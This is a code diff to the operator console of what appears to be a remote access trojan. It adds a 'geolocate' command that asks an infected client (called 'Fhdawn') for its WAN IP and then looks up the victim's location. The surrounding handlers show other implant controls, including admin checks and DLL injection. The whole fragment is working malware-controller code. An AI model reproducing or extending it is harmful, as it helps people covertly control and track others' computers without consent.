@@ -629,6 +629,10 @@ Open Ports
                     self.SendData("isadmin")
                     self.WaitForReply()
 
+                elif(main == "geolocate"):
+                    self.SendData("wanip")
+                    self.WaitForReply()
+
                 elif(main == "dllinject"):
                     
                     DLLTransfer()
@@ -911,7 +915,20 @@ Open Ports
                         # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                         print("[i] Please report this bug to developer with the information above.")
                         pass
-                            
+                
+                # Get Wanip, geolocate
+
+                elif(client_data.startswith("WANIP")):
+                    try:
+                        fileinfo = client_data.split(":")
+                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] WAN IP : " + fileinfo[1] + " ...")
+                        GeoLocate(fileinfo[1])
+                    except Exception as Error:
+                        print("[X] Error : " + str(Error))
+                        print("[i] Geolocation Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
                 elif(client_data.startswith("DEL_OK")):
                     try:
                         fileinfo = client_data.split(",")
